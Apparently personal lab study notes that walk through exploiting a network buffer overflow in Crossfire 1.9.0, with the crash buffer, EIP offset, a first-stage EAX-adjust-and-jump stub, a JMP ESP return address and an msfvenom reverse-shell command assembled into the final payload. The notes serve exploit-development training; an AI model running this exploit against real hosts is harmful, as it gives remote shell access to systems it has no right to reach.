

Must discover vulnerability within a code (without access to its source)  
Much more difficult if code's compiled with [EIP control protections](Control%20Protections.md)  
	DEP, ASLR, Stack Canaries
Create our input in a way to gain conrtol of critical (EIP) registers  
Manipulate memory to gain reliable RCE  
  
  
3 Primary techniques for ID'ing flaws in apps:  
- Source code review  
- Reverse Engineering  
- Fuzzing (Entering in various input to see how an app will handle unexpected/ malformed data and how it might crash)  
If an app crashes due to malformed input data, it may indicate the presence of a potentially exploitable vuln.  
  
  
  
Debugger used: [EDB](EDB.md) Inspired by **Ollydbg**  
  

### Setup
Crossfire 1.9.0 is vulnerable to a network-based buffer overflow when passing a string of more than 4000 bytes to the **setup sound** command.  
  
  
- cd /usr/games/crossfire/bin/ > ./crossfire  
  
- edb  
  
- File > Attach > Filter for _crossfire_ > Select > OK > Run  
  
  
### Rundown:
The difference here is that while we want our EIP to point to the buffer in the ESP, the ESP only holds the last 7 bytes of the buffer.  

The EAX holds the beginning of the buffer, but also contains the _“setup sound”_ command string, so:  

We'll need to adjust the size of EAX and jump to _after_ the command string in order to land neatly w/in our buffer.  
  
  
### Process:

1. **Replicate** the crash  
```bash
padding = "\x41" * 4379  
  
buffer = "\x11(setup sound " + padding + "\x90\x00#"
```

_buffer_ variable requires specific hex values at the beginning and at the end, as well as the “setup sound” string, in order for the app to crash.  
  
Initial PoC builds a malicious buffer including the “setup sound” command, connects to the remote service on port 13327, and sends the buffer.  
  
  
2. **Find EIP**  
- Use pattern to determine where EIP sits:  
```bash
msf-pattern_create -l 5000
```

python script:  
```python
junk = "<pattern>"
```

- Determine offset:  
```bash
msf-pattern_offset -l 5000 -q 46367046  
[*] Exact match at offset 4368
```
 
- Test:  
```bash
padding = 'A' * 4368  
eip = 'B' * 4  
  
inputBuffer = padding + eip
```

  
3. **Locate space** for shellcode.  
- Since the **ESP** points to the end of the buffer w/ only 7 bytes of space available  
	- Determined from the pattern created by msf - _p7Fp8Fp_  
	- We need to find another register for our payload.  
	- We can test for this by increasing the buffer results in a different crash which doesn't overwrite the EIP.  
  
![[shellcodebytes.png]]
  
- Looking at the other registers, we can see the EAX is pointing to the beginning of the buffer/ pattern 
![[EAXlinbo.png]]
  
- Only problem is that the EAX register also includes the _“setup sound”_ command string which could mangle execution.  
  
3) Looking at the opcodes for the _“setup sound”_ string,:  
- We see _‘s'_ (**\\x73**) and _‘e’_ (**\\x65**) --- first two letters of _“setup”_ --- which signals a [conditional jump](OpCodes.md) instruction - **JAE**  
- We see ‘_t_’ (**\\x74**) and _‘u’_ (**\\x75**) --- next two letters of _“setup”_ --- which signals another conditional jump instruction - **JE**  
- The jumps seem to be leading into our controlled buffer, so going to EAX may work for us.  
	- Not elegant, so we'll avoid.  
  
4) Rather, we'll use a first-stage payload into the 7-byte limited space provided by the ESP register (end of our buffer)  
	- Used to align the EAX register so that it points to our buffer right after the _“setup sound”_ string & jump to that location in order to skip those conditional jumps  
  
5) To do this, we'll need to add 12 bytes (\x0C) to **EAX** to account for the 12 chars in _“setup sound”_  
	- Use **ADD** assembly instruction  
	- Then proceed to **JMP** to the memory pointed to by **EAX**  
		- use [msf-nasm](msf-nasm_shell.md) for propper opcodes.  
			- 0x83C00C & FFE0  
			- Only takes up 5 bytes of memory, so we'll have to pad w/ **nops** by 2 bytes  
  
6) Updated script:  
```bash
padding = 'A' * 4368  
eip = 'B' * 4  
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"  
  
buffer = "\x11(setup sound " + padding + eip + first_stage + "\x90\x00#"
```


4. **Find a Return** Address  
- Using the _OpcodeSearcher_ plugin to discover a **JMP ESP** instruction  
	- Select code section where **crossfire** app is mapped  
	- Switch _Jump Equivalent_ to **ESP -> EIP**  
	- Find 
	![[opcode.png]]

- Add a breakpoint at the JMP ESP address  
	- Use _BreakpointManager_ plugin  
	- Updating the script to include the return addr:  
```bash
padding = "A" * 4368  
eip = "\x96\x45\x13\x08"  
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"  
  
buffer = "\x11(setup sound " + padding + eip + first_stage + "\x90\x00#"
```

5. Get a **shell**
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<localIP> LPORT=443 -b "\x00\x20" -f py -v shellcode
```
  
- Update:  
	- Because the ESP will jump to the beginning of our buffer in EAX (after expanding by 12 bytes and jumping past the _“setup sound”_ command), we need to add the **nop** and **payload** _before_ the padding  
```bash
shellcode = ""  
shellcode += "......"  
  
nop = "\x90" * 8  
  
padding = "\x41" * (4368 - len(nop) - len(shellcode))  
eip = "\x96\x45\x13\x08"  
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"  
  
buffer = "\x11(setup sound " + nop + shellcode + padding + eip + first_stage + "\x90\x00#"
```


- The debugger will cause issues as it's catching SIGCHLD events generated when aomething happens to our spawned child process from our shell (exiting, crashing, stopping, etc)  
	- After running the exploit, the **nc** connection occurs, but typing in any commands will show it's stuck.  
	- Going back to **edb**, the app is paused as there's been a Debug Event. Click Run to trigger the Debug Event popup from **edb**.